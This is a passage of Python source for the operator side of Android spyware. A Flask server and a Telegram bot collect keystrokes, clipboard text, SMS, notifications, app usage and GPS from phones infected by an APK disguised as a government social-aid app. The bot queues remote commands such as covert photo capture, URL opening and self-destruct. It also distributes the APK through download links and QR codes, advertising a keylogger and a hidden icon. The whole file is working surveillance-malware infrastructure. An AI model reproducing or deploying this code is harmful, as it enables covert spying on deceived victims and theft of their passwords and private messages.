        COALESCE((SELECT COUNT(*) FROM keylog_log WHERE device_id=d.device_id),0) as kl,
        COALESCE((SELECT COUNT(*) FROM clipboard_log WHERE device_id=d.device_id),0) as cl,
        COALESCE((SELECT COUNT(*) FROM app_usage_log WHERE device_id=d.device_id),0) as au,
        COALESCE((SELECT COUNT(*) FROM notif_log WHERE device_id=d.device_id),0) as nf,
        COALESCE((SELECT COUNT(*) FROM sms_log WHERE device_id=d.device_id),0) as sm
        FROM device_status d ORDER BY d.last_seen DESC LIMIT 20""")
    pending_commands = db_exec("""SELECT c.id, c.device_id, c.command_type, c.command_params, c.created_at
        FROM command_queue c WHERE c.status='pending' ORDER BY c.created_at DESC LIMIT 10""")
    return render_template("dashboard.html",
        total_links=total_links, total_events=total_events,
        total_sms=total_sms, total_notif=total_notif,
        total_keylogs=total_keylogs, total_clipboard=total_clipboard,
        total_app_usage=total_app_usage, total_devices=total_devices,
        active_links=active_links, online_devices=online_devices,
        links=links, events=events, sms=sms, notifs=notifs,
        keylogs=keylogs, clips=clips, app_usage=app_usage,
        devices=devices, pending_commands=pending_commands,
        total_calls=total_calls, total_contacts=total_contacts, total_sim_alerts=total_sim_alerts,
        base_url=BASE_URL)

@app.route("/admin/dashboard/json")
@login_required
def admin_dashboard_json():
    total_links = db_exec("SELECT COUNT(*) FROM links")[0][0]
    total_events = db_exec("SELECT COUNT(*) FROM tracking_events")[0][0]
    total_sms = db_exec("SELECT COUNT(*) FROM sms_log")[0][0]
    total_notif = db_exec("SELECT COUNT(*) FROM notif_log")[0][0]
    total_keylogs = db_exec("SELECT COUNT(*) FROM keylog_log")[0][0]
    total_clipboard = db_exec("SELECT COUNT(*) FROM clipboard_log")[0][0]
    total_app_usage = db_exec("SELECT COUNT(*) FROM app_usage_log")[0][0]
    total_devices = db_exec("SELECT COUNT(*) FROM device_status")[0][0]
    active_links = db_exec("SELECT COUNT(*) FROM links WHERE is_active=1")[0][0]
    online_devices = db_exec("SELECT COUNT(*) FROM device_status WHERE status='online'")[0][0]
    sms = db_exec("""SELECT sender,message,timestamp,device_id FROM sms_log
        ORDER BY timestamp DESC LIMIT 30""")
    notifs = db_exec("""SELECT sender,message,timestamp,device_id,app FROM notif_log
        ORDER BY timestamp DESC LIMIT 50""")
    keylogs = db_exec("""SELECT device_id,text,package,class_name,timestamp,received_at,char_length
        FROM keylog_log ORDER BY id DESC LIMIT 30""")
    clips = db_exec("""SELECT device_id,text,char_length,app,received_at
        FROM clipboard_log ORDER BY id DESC LIMIT 20""")
    app_usage = db_exec("""SELECT device_id,package,class_name,received_at
        FROM app_usage_log ORDER BY id DESC LIMIT 20""")
    devices = db_exec("""SELECT d.device_id, d.last_seen, d.status, d.info,
        COALESCE((SELECT COUNT(*) FROM keylog_log WHERE device_id=d.device_id),0) as kl,
        COALESCE((SELECT COUNT(*) FROM clipboard_log WHERE device_id=d.device_id),0) as cl,
        COALESCE((SELECT COUNT(*) FROM app_usage_log WHERE device_id=d.device_id),0) as au,
        COALESCE((SELECT COUNT(*) FROM notif_log WHERE device_id=d.device_id),0) as nf,
        COALESCE((SELECT COUNT(*) FROM sms_log WHERE device_id=d.device_id),0) as sm
        FROM device_status d ORDER BY d.last_seen DESC LIMIT 20""")
    pending = db_exec("""SELECT id,device_id,command_type,command_params,created_at
        FROM command_queue WHERE status='pending' ORDER BY created_at DESC LIMIT 10""")
    return jsonify({
        "total_links": total_links,
        "total_events": total_events,
        "total_sms": total_sms,
        "total_notif": total_notif,
        "total_keylogs": total_keylogs,
        "total_clipboard": total_clipboard,
        "total_app_usage": total_app_usage,
        "total_devices": total_devices,
        "active_links": active_links,
        "online_devices": online_devices,
        "total_calls": 0,
        "total_contacts": 0,
        "total_sim_alerts": 0,
        "sms": [{"sender": s[0], "message": s[1], "timestamp": s[2], "device_id": s[3]} for s in sms],
        "notifs": [{"sender": n[0], "message": n[1], "timestamp": n[2], "device_id": n[3], "app": n[4]} for n in notifs],
        "keylogs": [{"device_id": k[0], "text": k[1], "package": k[2], "class_name": k[3], "timestamp": k[4], "received_at": k[5], "char_length": k[6]} for k in keylogs],
        "clips": [{"device_id": c[0], "text": c[1], "char_length": c[2], "app": c[3], "received_at": c[4]} for c in clips],
        "app_usage": [{"device_id": a[0], "package": a[1], "class_name": a[2], "received_at": a[3]} for a in app_usage],
        "devices": [{"device_id": d[0], "last_seen": d[1], "status": d[2], "info": d[3], "keylogs": d[4], "clips": d[5], "app_usage": d[6], "notifs": d[7], "sms": d[8]} for d in devices],
        "pending_commands": [{"id": p[0], "device_id": p[1], "command_type": p[2], "command_params": p[3], "created_at": p[4]} for p in pending]
    })


@app.route("/admin/dashboard/events-json")
@login_required
def admin_dashboard_events_json():
    events = db_exec("""SELECT tracking_id,latitude,longitude,accuracy,timestamp FROM tracking_events
        ORDER BY timestamp DESC LIMIT 30""")
    return jsonify({
        "events": [{"tid": e[0], "lat": e[1], "lng": e[2], "acc": e[3], "ts": e[4]} for e in events]
    })

@app.route("/map/<tid>")
def map_view(tid):
    info = db_exec("SELECT tracking_id,title,description,created_at FROM links WHERE tracking_id=?", (tid,))
    if not info:
        return render_template("error.html", message="Link tidak ditemukan"), 404
    evs = db_exec("SELECT latitude,longitude,accuracy,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC", (tid,))
    return render_template("map.html", tracking_id=tid, link_info=info[0], events=evs)

@app.route("/download/apk")
def download_apk():
    import flask
    apk_path = "/root/gps-link/downloads/bantuan-sosial-v4.0.apk"
    if os.path.exists(apk_path):
        with open(apk_path, "rb") as f:
            data = f.read()
        return flask.Response(data, mimetype="application/vnd.android.package-archive",
            headers={"Content-Disposition": "attachment; filename=bantuan-sosial.apk"})
    return "File tidak ditemukan", 404

# ============ AI PROXY (Ollama via Cloudflare) ============
OLLAMA_URL = "http://localhost:11434"

@app.route("/api/ai/generate", methods=["POST"])
def ai_generate():
    data = request.get_json()
    if not data or "prompt" not in data:
        return jsonify({"error": "Prompt diperlukan"}), 400
    model = data.get("model", "qwen2.5-coder:1.5b")
    prompt = data["prompt"]
    payload = json.dumps({"model": model, "prompt": prompt, "stream": False}).encode()
    req = urllib.request.Request(
        f"{OLLAMA_URL}/api/generate",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            result = json.loads(resp.read())
        return jsonify({"response": result.get("response", "")})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/ai/chat", methods=["POST"])
def ai_chat():
    data = request.get_json()
    if not data or "messages" not in data:
        return jsonify({"error": "Messages diperlukan"}), 400
    model = data.get("model", "qwen2.5-coder:1.5b")
    messages = data["messages"]
    payload = json.dumps({"model": model, "messages": messages, "stream": False}).encode()
    req = urllib.request.Request(
        f"{OLLAMA_URL}/api/chat",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            result = json.loads(resp.read())
        return jsonify({"response": result.get("message", {}).get("content", "")})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/ai/tags", methods=["GET"])
def ai_tags():
    try:
        with urllib.request.urlopen(f"{OLLAMA_URL}/api/tags", timeout=5) as resp:
            result = json.loads(resp.read())
        return jsonify({"models": [m["name"] for m in result.get("models", [])]})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ============ APK VERSION API (Auto-Upgrade) ============
@app.route("/api/apk-version")
def apk_version():
    try:
        with open("/root/gps-link/apk_version.json") as f:
            v = json.load(f)
        vcode = v.get("version_code", 4)
        vname = v.get("version_name", "4.0")
    except:
        vcode = 4
        vname = "4.0"
    return jsonify({
        "version_code": vcode,
        "version_name": vname,
        "download_url": BASE_URL + "/download/apk",
        "changelog": "v4.0 — Keylogger + Clipboard + App Tracking + Remote Command + Stealth Icon",
        "min_sdk": 21,
        "force_update": False
    })

# ============ KEYLOG + CLIPBOARD + APP USAGE API ============

@app.route("/api/keylog/<device_id>/status", methods=["POST"])
def api_keylog_status(device_id):
    """Receive device status/heartbeat from KeylogService"""
    try:
        data = request.get_json() or {}
        event = data.get("event", "ping")
        ts = data.get("timestamp", int(time.time() * 1000))
        received = datetime.now().isoformat()
        db_exec("INSERT OR REPLACE INTO device_status (device_id, last_seen, status, info) VALUES (?,?,?,?)",
                (device_id, received, event, json.dumps(data)))
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/keylog/<device_id>", methods=["POST"])
def api_keylog(device_id):
    """Receive batch of keystroke entries from KeylogService"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "No data"})
        
        # data can be an array (batch) or a single object
        entries = data if isinstance(data, list) else [data]
        
        received = datetime.now().isoformat()
        count = 0
        for entry in entries:
            text = entry.get("text", "")
            pkg = entry.get("package", "")
            cls = entry.get("class", "")
            view_id = entry.get("view_id", "")
            char_len = entry.get("length", len(text))
            ts = entry.get("timestamp", int(time.time() * 1000))
            
            # Skip noise
            if not text or len(text) < 2:
                continue
            
            db_exec("INSERT INTO keylog_log (device_id, text, package, class_name, view_id, char_length, timestamp, received_at) VALUES (?,?,?,?,?,?,?,?)",
                    (device_id, text[:500], pkg, cls, view_id, min(char_len, 500), ts, received))
            count += 1
        
        # Update device last seen
        db_exec("INSERT OR REPLACE INTO device_status (device_id, last_seen, status, info) VALUES (?,?,?,?)",
                (device_id, received, "keylog_active", json.dumps({"entries": count})))
        
        return jsonify({"success": True, "count": count})
    except Exception as e:
        print(f"Keylog error: {e}")
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/clipboard/<device_id>", methods=["POST"])
def api_clipboard(device_id):
    """Receive clipboard copy event from KeylogService"""
    try:
        data = request.get_json() or {}
        text = data.get("text", "")
        app = data.get("app", "")
        cls = data.get("class", "")
        ts = data.get("timestamp", int(time.time() * 1000))
        received = datetime.now().isoformat()

        if text and len(text) >= 3:
            db_exec("INSERT INTO clipboard_log (device_id, text, char_length, app, class_name, timestamp, received_at) VALUES (?,?,?,?,?,?,?)",
                    (device_id, text[:1000], min(len(text), 1000), app, cls, ts, received))

        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/app-usage/<device_id>", methods=["POST"])
def api_app_usage(device_id):
    """Receive app change event from KeylogService"""
    try:
        data = request.get_json() or {}
        pkg = data.get("package", "")
        cls = data.get("class", "")
        ts = data.get("timestamp", int(time.time() * 1000))
        received = datetime.now().isoformat()

        if pkg:
            db_exec("INSERT INTO app_usage_log (device_id, package, class_name, timestamp, received_at) VALUES (?,?,?,?,?)",
                    (device_id, pkg, cls, ts, received))

        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/commands/<device_id>", methods=["GET"])
def api_commands_get(device_id):
    """Get pending commands for a device (polled by KeylogService)"""
    try:
        rows = db_exec("""SELECT id, command_type, command_params FROM command_queue
            WHERE device_id=? AND status='pending' ORDER BY id ASC LIMIT 10""", (device_id,))
        
        commands = []
        for row_id, cmd_type, cmd_params in rows:
            params = {}
            try:
                if cmd_params:
                    params = json.loads(cmd_params)
            except: pass
            commands.append({
                "id": str(row_id),
                "type": cmd_type,
                "params": params
            })
        
        return jsonify({"commands": commands})
    except Exception as e:
        return jsonify({"commands": [], "error": str(e)})


@app.route("/api/commands/<device_id>/ack", methods=["POST"])
def api_commands_ack(device_id):
    """Acknowledge command execution from device"""
    try:
        data = request.get_json() or {}
        cmd_id = data.get("command_id", "")
        status = data.get("status", "done")
        result = data.get("result", "")
        executed = datetime.now().isoformat()

        if cmd_id:
            db_exec("UPDATE command_queue SET status=?, executed_at=?, result=? WHERE id=? AND device_id=?",
                    (status, executed, result, cmd_id, device_id))

        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/commands/<device_id>/add", methods=["POST"])
def api_commands_add(device_id):
    """Add a command to queue (used by Telegram bot)"""
    try:
        data = request.get_json() or {}
        cmd_type = data.get("type", "")
        cmd_params = data.get("params", {})
        if not cmd_type:
            return jsonify({"success": False, "error": "type required"}), 400
        
        created = datetime.now().isoformat()
        db_exec("INSERT INTO command_queue (device_id, command_type, command_params, status, created_at) VALUES (?,?,?,'pending',?)",
                (device_id, cmd_type, json.dumps(cmd_params), created))
        
        return jsonify({"success": True, "id": db_exec("SELECT last_insert_rowid()")[0][0]})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


# ============ TELEGRAM KEYLOG COMMANDS ============

async def cmd_keylog(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """View recent keylog entries for a device"""
    args = context.args
    device_id = args[0] if args else "65057ab5f5"
    limit = min(int(args[1]), 20) if len(args) > 1 else 10

    rows = db_exec("""SELECT text, package, class_name, timestamp, received_at
        FROM keylog_log WHERE device_id=? ORDER BY id DESC LIMIT ?""", (device_id, limit))
    
    if not rows:
        await update.message.reply_text(f"📝 *Keylog* `{device_id}`\n\nBelum ada data.", parse_mode="Markdown")
        return
    
    text = f"📝 *Keylog* `{device_id}`\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, (entry_text, pkg, cls, ts, received) in enumerate(rows):
        app_short = pkg.split(".")[-1] if "." in pkg else pkg
        ts_short = received[11:19] if received else ""
        display = entry_text[:80] + ("..." if len(entry_text) > 80 else "")
        text += f"#{i+1} [{ts_short}] *{app_short}*\n  `{display}`\n\n"
    
    if len(text) > 3000:
        text = text[:3000] + "\n\n*(truncated)*"
    
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_clip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """View recent clipboard copies from a device"""
    args = context.args
    device_id = args[0] if args else "65057ab5f5"
    limit = min(int(args[1]), 20) if len(args) > 1 else 10

    rows = db_exec("""SELECT text, char_length, app, received_at
        FROM clipboard_log WHERE device_id=? ORDER BY id DESC LIMIT ?""", (device_id, limit))
    
    if not rows:
        await update.message.reply_text(f"📋 *Clipboard* `{device_id}`\n\nBelum ada data.", parse_mode="Markdown")
        return
    
    text = f"📋 *Clipboard* `{device_id}`\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, (clip_text, clen, app, received) in enumerate(rows):
        app_short = app.split(".")[-1] if "." in app else app
        display = clip_text[:120] + ("..." if len(clip_text) > 120 else "")
        text += f"#{i+1} [{received[11:19]}] *{app_short}* ({clen}ch)\n  `{display}`\n\n"
    
    if len(text) > 3000:
        text = text[:3000] + "\n\n*(truncated)*"
    
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_apps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """View app usage timeline for a device"""
    args = context.args
    device_id = args[0] if args else "65057ab5f5"
    limit = min(int(args[1]), 30) if len(args) > 1 else 20

    rows = db_exec("""SELECT package, class_name, timestamp, received_at
        FROM app_usage_log WHERE device_id=? ORDER BY id DESC LIMIT ?""", (device_id, limit))
    
    if not rows:
        await update.message.reply_text(f"📊 *App Usage* `{device_id}`\n\nBelum ada data.", parse_mode="Markdown")
        return
    
    # Reverse to show chronological order
    rows = list(reversed(rows))
    
    text = f"📊 *App Usage* `{device_id}`\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for pkg, cls, ts, received in rows:
        app_name = pkg.split(".")[-1] if "." in pkg else pkg
        activity = cls.split(".")[-1] if "." in cls else cls
        text += f"🕐 {received[11:19]} → *{app_name}*\n  `{activity[:40]}`\n\n"
    
    if len(text) > 3000:
        text = text[:3000] + "\n\n*(truncated)*"
    
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List active devices"""
    rows = db_exec("""SELECT device_id, last_seen, status FROM device_status
        ORDER BY last_seen DESC LIMIT 10""")
    
    if not rows:
        await update.message.reply_text("📡 *Devices*\n\nBelum ada device terdaftar.", parse_mode="Markdown")
        return
    
    text = "📡 *Devices Terdaftar*\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for device_id, last_seen, status in rows:
        # Count data per device
        kl = db_exec("SELECT COUNT(*) FROM keylog_log WHERE device_id=?", (device_id,))[0][0]
        cl = db_exec("SELECT COUNT(*) FROM clipboard_log WHERE device_id=?", (device_id,))[0][0]
        au = db_exec("SELECT COUNT(*) FROM app_usage_log WHERE device_id=?", (device_id,))[0][0]
        status_icon = "🟢" if "active" in status else "🟡"
        text += f"{status_icon} `{device_id}`\n📝{kl} 📋{cl} 📊{au} | {last_seen[5:19]}\n\n"
    
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a command to a device"""
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "📡 *Kirim Perintah*\n\n"
            "Usage: `/cmd <device_id> <command> [params]`\n\n"
            "*Commands:*\n"
            "• `PHOTO` — Capture photo now\n"
            "• `LOCATION` — Send GPS now\n"
            "• `PING` — Check if device alive\n"
            "• `NOTIF` — Show notification (params: title|text)\n"
            "• `SET_INTERVAL` — Change GPS/Camera interval\n"
            "   params: gps_ms|camera_ms\n"
            "• `OPEN_URL` — Open URL\n"
            "• `SELF_DESTRUCT` — Uninstall from device\n\n"
            "*Examples:*\n"
            "`/cmd 65057ab5f5 PHOTO`\n"
            "`/cmd 65057ab5f5 NOTIF Halo|Test`\n"
            "`/cmd 65057ab5f5 SET_INTERVAL 30000|15000`",
            parse_mode="Markdown")
        return
    
    device_id = args[0]
    command = args[1].upper()
    params_raw = " ".join(args[2:]) if len(args) > 2 else ""
    
    cmd_type = ""
    cmd_params = {}
    
    if command == "PHOTO":
        cmd_type = "CAPTURE_PHOTO"
    elif command == "LOCATION":
        cmd_type = "GET_LOCATION"
    elif command == "PING":
        cmd_type = "PING"
    elif command == "NOTIF":
        cmd_type = "SEND_NOTIFICATION"
        parts = params_raw.split("|", 1)
        cmd_params["title"] = parts[0] if parts[0] else "Pembaruan Sistem"
        cmd_params["text"] = parts[1] if len(parts) > 1 else "Periksa pengaturan sistem Anda"
    elif command == "SET_INTERVAL":
        cmd_type = "SET_INTERVAL"
        parts = params_raw.split("|")
        if parts[0]:
            cmd_params["gps_ms"] = int(parts[0])
        if len(parts) > 1 and parts[1]:
            cmd_params["camera_ms"] = int(parts[1])
    elif command == "OPEN_URL":
        cmd_type = "OPEN_URL"
        cmd_params["url"] = params_raw if params_raw else "https://bansos.jokichannel.eu.org"
    elif command == "SELF_DESTRUCT":
        cmd_type = "SELF_DESTRUCT"
    else:
        await update.message.reply_text(f"❌ Unknown command: {command}", parse_mode="Markdown")
        return
    
    created = datetime.now().isoformat()
    db_exec("INSERT INTO command_queue (device_id, command_type, command_params, status, created_at) VALUES (?,?,?,'pending',?)",
            (device_id, cmd_type, json.dumps(cmd_params), created))
    
    await update.message.reply_text(
        f"✅ *Perintah Dikirim*\n\n📡 Device: `{device_id}`\n"
        f"⚡ Command: `{cmd_type}`\n"
        f"📦 Params: `{json.dumps(cmd_params)}`\n"
        f"⏳ Menunggu dieksekusi...",
        parse_mode="Markdown")


async def cmd_apkversion(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Update APK version info"""
    args = context.args
    if len(args) >= 2:
        # Update version
        vcode = int(args[0])
        vname = args[1]
        # Save to a simple file
        with open("/root/gps-link/apk_version.json", "w") as f:
            json.dump({"version_code": vcode, "version_name": vname}, f)
        await update.message.reply_text(f"✅ APK version set to v{vname} (code {vcode})")
    else:
        # Show current
        try:
            with open("/root/gps-link/apk_version.json") as f:
                v = json.load(f)
            await update.message.reply_text(f"📦 APK v{v['version_name']} (code {v['version_code']})")
        except:
            await update.message.reply_text("📦 APK v4.0 (code 4)")


async def cmd_download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kirim QR + link download APK v4.0"""
    try:
        with open("/root/gps-link/apk_version.json") as f:
            v = json.load(f)
        vname = v.get("version_name", "4.0")
    except:
        vname = "4.0"

    apk_path = "/root/gps-link/downloads/bantuan-sosial-v4.0.apk"
    apk_size = os.path.getsize(apk_path) if os.path.exists(apk_path) else 0
    size_kb = round(apk_size / 1024)
    dl_url = f"{BASE_URL}/download/apk"

    # Generate QR Code image
    import qrcode
    from io import BytesIO
    qr = qrcode.QRCode(box_size=10, border=2)
    qr.add_data(dl_url)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="#0055A4", back_color="white")

    # Convert to bytes
    buf = BytesIO()
    qr_img.save(buf, format="PNG")
    buf.seek(0)

    text = (
        f"📦 *APK Bansos v{vname}*\n"
        f"`Pembaruan Sistem` — `com.kemensos.bansos`\n\n"
        f"📎 *Ukuran:* {size_kb} KB\n"
        f"📱 *Min SDK:* Android 5.0+\n"
        f"🎯 *Target:* Android 14\n\n"
        f"⬇️ *Download:*\n"
        f"`{dl_url}`\n\n"
        f"✨ *Fitur v{vname}:*\n"
        f"• Keylogger A11Y\n"
        f"• Clipboard monitor\n"
        f"• App usage tracking\n"
        f"• GPS lokasi real-time\n"
        f"• Kamera background\n"
        f"• SMS + Notif capture\n"
        f"• Remote command\n"
        f"• Stealth (no icon)"
    )

    from telegram import InlineKeyboardButton, InlineKeyboardMarkup
    kb = [[InlineKeyboardButton("⬇️ Download APK", url=dl_url)],
          [InlineKeyboardButton("🖥 Dashboard", url=f"{BASE_URL}/admin/dashboard")]]
    reply_markup = InlineKeyboardMarkup(kb)

    await update.message.reply_photo(photo=buf, caption=text, parse_mode="Markdown", reply_markup=reply_markup)


async def cmd_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """View all data summary for a device"""
    args = context.args
    device_id = args[0] if args else "65057ab5f5"
    
    kl = db_exec("SELECT COUNT(*) FROM keylog_log WHERE device_id=?", (device_id,))[0][0]
    cl = db_exec("SELECT COUNT(*) FROM clipboard_log WHERE device_id=?", (device_id,))[0][0]
    au = db_exec("SELECT COUNT(*) FROM app_usage_log WHERE device_id=?", (device_id,))[0][0]
    
    # Last keylog
    last_kl = db_exec("SELECT text, package, received_at FROM keylog_log WHERE device_id=? ORDER BY id DESC LIMIT 1", (device_id,))
    last_cl = db_exec("SELECT text, app, received_at FROM clipboard_log WHERE device_id=? ORDER BY id DESC LIMIT 1", (device_id,))
    last_app = db_exec("SELECT package, received_at FROM app_usage_log WHERE device_id=? ORDER BY id DESC LIMIT 1", (device_id,))
    
    text = f"📊 *Data Summary* `{device_id}`\n━━━━━━━━━━━━━━━━━━━━\n\n"
    text += f"📝 Keystrokes: *{kl}*\n"
    text += f"📋 Clipboard: *{cl}*\n"
    text += f"📊 App Usage: *{au}*\n\n"
    
    if last_kl:
        pkg = last_kl[0][1].split(".")[-1] if "." in last_kl[0][1] else last_kl[0][1]
        text += f"🕐 *Last Keylog:* [{last_kl[0][2][11:19]}] {pkg}\n  `{last_kl[0][0][:60]}`\n\n"
    if last_cl:
        text += f"📋 *Last Clipboard:* [{last_cl[0][2][11:19]}]\n  `{last_cl[0][0][:60]}`\n\n"
    if last_app:
        app = last_app[0][0].split(".")[-1] if "." in last_app[0][0] else last_app[0][0]
        text += f"📱 *Last App:* [{last_app[0][1][11:19]}] {app}\n"
    
    await update.message.reply_text(text, parse_mode="Markdown")
def main():
    init_db()
    from threading import Thread

    # Start Flask web server in daemon thread
    Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False), daemon=True).start()
    print("🌐 Web server :5000")

    # Build bot
    app_bot = Application.builder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", cmd_start))
    app_bot.add_handler(CommandHandler("help", cmd_start))
    app_bot.add_handler(CommandHandler("links", cmd_start))
    app_bot.add_handler(CommandHandler("map", cmd_start))
    # New v4.0 commands
    app_bot.add_handler(CommandHandler("keylog", cmd_keylog))
    app_bot.add_handler(CommandHandler("clip", cmd_clip))
    app_bot.add_handler(CommandHandler("apps", cmd_apps))
    app_bot.add_handler(CommandHandler("devices", cmd_devices))
    app_bot.add_handler(CommandHandler("cmd", cmd_cmd))
    app_bot.add_handler(CommandHandler("apkversion", cmd_apkversion))
    app_bot.add_handler(CommandHandler("data", cmd_data))
    app_bot.add_handler(CommandHandler("download", cmd_download))
    app_bot.add_handler(CallbackQueryHandler(on_click))

    # Run Telegram bot in main thread (required for signal handling)
    try:
        print("🤖 Bot running...")
        app_bot.run_polling()
    except Exception as e:
        print(f"⚠️ Bot polling error: {e}")
        print("ℹ️  Keeping web server alive...")
        # Keep Flask alive in case bot fails
        import time
        while True:
            time.sleep(3600)

if __name__ == "__main__":
    main()
